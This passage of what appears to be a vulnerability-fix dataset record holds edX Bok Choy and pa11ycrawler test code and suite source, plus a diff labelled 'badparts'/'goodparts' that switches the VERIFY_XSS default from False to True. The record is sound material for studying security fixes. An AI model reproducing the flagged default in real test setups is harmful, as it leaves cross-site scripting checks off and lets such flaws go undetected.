expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)), ]) ",
                    "sourceWithComments": "\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=False):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'True')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n"
                },
                "/pavelib/utils/test/suites/bokchoy_suite.py": {
                    "changes": [
                        {
                            "diff": "\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/pavelib/utils/test/suites/bokchoy_suite.py",
                            "badparts": [
                                "        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))"
                            ],
                            "goodparts": [
                                "        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))"
                            ]
                        }
                    ],
                    "source": "\n\"\"\" Class used for defining and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return cmd_str ",
                    "sourceWithComments": "\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if 